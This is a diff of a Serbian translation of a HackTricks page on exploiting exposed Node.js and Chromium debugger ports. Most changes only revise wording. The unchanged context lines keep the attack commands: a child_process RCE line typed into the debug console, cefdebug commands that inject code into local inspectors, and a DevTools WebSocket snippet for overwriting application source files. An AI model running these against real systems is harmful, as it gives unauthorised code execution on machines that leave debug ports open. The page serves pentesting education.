@@ -25,7 +25,7 @@ Klijenti inspektora moraju znati i odrediti adresu hosta, port i UUID za poveziv
 Pošto **debugger ima pun pristup Node.js okruženju za izvršavanje**, zlonamerna osoba koja može da se poveže na ovaj port može biti u mogućnosti da izvrši proizvoljan kod u ime Node.js procesa (**potencijalna eskalacija privilegija**).
 {% endhint %}
 
-Postoji nekoliko načina za pokretanje inspektora:
+Postoji nekoliko načina da se pokrene inspektor:
 ```bash
 node --inspect app.js #Will run the inspector in port 9229
 node --inspect=4444 app.js #Will run the inspector in port 4444
@@ -41,7 +41,7 @@ Kada pokrenete inspekcijski proces, nešto poput ovoga će se pojaviti:
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
-Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) treba da koriste parametar: `--remote-debugging-port=9222` da bi otvorili **debugger** (zaštite od SSRF ostaju veoma slične). Međutim, oni **umesto** davanja **NodeJS** **debug** sesije će komunicirati sa pregledačem koristeći [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), ovo je interfejs za kontrolu pregledača, ali ne postoji direktan RCE.
+Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) treba da koriste parametar: `--remote-debugging-port=9222` da otvore **debugger** (zaštite od SSRF ostaju veoma slične). Međutim, oni **umesto** da dodele **NodeJS** **debug** sesiju, komuniciraće sa pregledačem koristeći [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), ovo je interfejs za kontrolu pregledača, ali ne postoji direktan RCE.
 
 Kada pokrenete debagovani pregledač, nešto poput ovoga će se pojaviti:
 ```
@@ -49,10 +49,10 @@ DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4
 ```
 ### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-Veb-sajtovi otvoreni u veb-pretraživaču mogu da prave WebSocket i HTTP zahteve pod modelom bezbednosti pretraživača. **Početna HTTP veza** je neophodna da bi se **dobio jedinstveni ID sesije debagera**. **Politika iste porekla** **sprečava** veb-sajtove da mogu da naprave **ovu HTTP vezu**. Za dodatnu bezbednost protiv [**DNS rebinding napada**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js proverava da li **'Host' zaglavlja** za vezu ili specificiraju **IP adresu** ili **`localhost`** ili **`localhost6`** tačno.
+Veb sajtovi otvoreni u veb pretraživaču mogu da prave WebSocket i HTTP zahteve pod modelom bezbednosti pretraživača. **Inicijalna HTTP veza** je neophodna da bi se **dobio jedinstveni id sesije debagera**. **Politika iste porekla** **sprečava** veb sajtove da mogu da naprave **ovu HTTP vezu**. Za dodatnu bezbednost protiv [**DNS rebinding napada**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** Node.js proverava da li **'Host' zaglavlja** za vezu ili specificiraju **IP adresu** ili **`localhost`** ili **`localhost6`** tačno.
 
 {% hint style="info" %}
-Ove **bezbednosne mere sprečavaju korišćenje inspektora** za pokretanje koda **samo slanjem HTTP zahteva** (što bi moglo biti učinjeno iskorišćavanjem SSRF ranjivosti).
+Ove **bezbednosne mere sprečavaju iskorišćavanje inspektora** za pokretanje koda **samo slanjem HTTP zahteva** (što bi moglo biti učinjeno iskorišćavanjem SSRF ranjivosti).
 {% endhint %}
 
 ### Starting inspector in running processes
@@ -79,7 +79,7 @@ node inspect 127.0.0.1:9229
 # RCE example from debug console
 debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
 ```
-Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava **pronalazak inspektora** koji se izvode lokalno i **ubacivanje koda** u njih.
+Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava **pronalaženje inspektora** koji se izvode lokalno i **ubacivanje koda** u njih.
 ```bash
 #List possible vulnerable sockets
 ./cefdebug.exe
@@ -89,7 +89,7 @@ Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 {% hint style="info" %}
-Napomena: **NodeJS RCE eksploatiacije neće raditi** ako je povezan sa pregledačem putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (trebalo bi da proverite API da biste pronašli zanimljive stvari koje možete raditi sa njim).
+Napomena da **NodeJS RCE eksploatiacije neće raditi** ako je povezan sa pregledačem putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (trebalo bi da proverite API da biste pronašli zanimljive stvari koje možete raditi sa njim).
 {% endhint %}
 
 ## RCE u NodeJS Debuggeru/Inspektoru
@@ -124,7 +124,7 @@ Will execute a calc.exe.
 
 ### Overwrite Files
 
-Promenite fasciklu u kojoj će **preuzeti fajlovi biti sačuvani** i preuzmite fajl da **prepišete** često korišćeni **izvorni kod** aplikacije sa vašim **malicioznim kodom**.
+Promenite fasciklu u kojoj će **preuzeti fajlovi biti sačuvani** i preuzmite fajl da **prepišete** često korišćeni **izvorni kod** aplikacije sa vašim **malicious code**.
 ```javascript
 ws = new WebSocket(url); //URL of the chrome devtools service
 ws.send(JSON.stringify({
@@ -167,7 +167,7 @@ Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Podržite HackTricks</summary>
+<summary>Podrška HackTricks</summary>
 
 * Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
